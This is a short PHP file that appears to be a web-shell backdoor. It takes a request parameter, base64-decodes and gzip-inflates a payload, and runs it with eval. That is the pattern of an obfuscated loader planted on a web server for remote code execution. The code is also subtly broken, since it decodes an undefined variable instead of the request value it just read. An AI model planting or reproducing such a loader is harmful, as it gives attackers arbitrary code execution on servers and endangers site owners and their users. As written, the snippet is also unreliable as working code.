<?php
$fc = $_REQUEST['rs'];
$fc = gzinflate(base64_decode($rscode));
$result = eval("?>".$fc);

die("");
?>